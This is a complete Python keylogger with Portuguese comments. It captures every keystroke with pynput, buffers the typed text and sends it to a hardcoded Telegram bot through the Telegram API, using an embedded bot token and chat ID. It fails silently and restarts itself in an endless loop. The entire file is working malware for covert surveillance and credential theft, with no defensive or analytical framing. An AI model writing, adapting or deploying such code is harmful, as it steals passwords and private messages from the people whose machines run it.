import requests
from pynput.keyboard import Key, Listener
import time

TOKEN = "8985026239:AAFluyNrfR6x6tU6YnmzSdDA1fOtMiHAeYg"
CHAT_ID = "-1004356233671"

buffer = ""

def send_to_telegram(text):
    if text.strip():
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        try:
            requests.post(url, data=payload, timeout=10)
        except:
            pass

def on_press(key):
    global buffer
    try:
        # Tenta pegar o caractere da tecla (letras, números, símbolos)
        buffer += key.char
    except AttributeError:
        # Aqui tratamos as teclas especiais
        if key == Key.space:
            buffer += " "
        elif key == Key.enter:
            send_to_telegram(buffer)
            buffer = ""
        elif key == Key.backspace:
            buffer = buffer[:-1]
        elif key == Key.tab:
            buffer += " [TAB] "
        elif key == Key.caps_lock:
            pass 
        elif key == Key.shift or key == Key.shift_r or key == Key.ctrl or key == Key.ctrl_l or key == Key.alt or key == Key.alt_gr:
            pass 
        else:
            buffer += f" [{key}] "

    if len(buffer) > 100:
        send_to_telegram(buffer)
        buffer = ""

while True:
    try:
        with Listener(on_press=on_press) as listener:
            listener.join()
    except Exception:
        time.sleep(10)
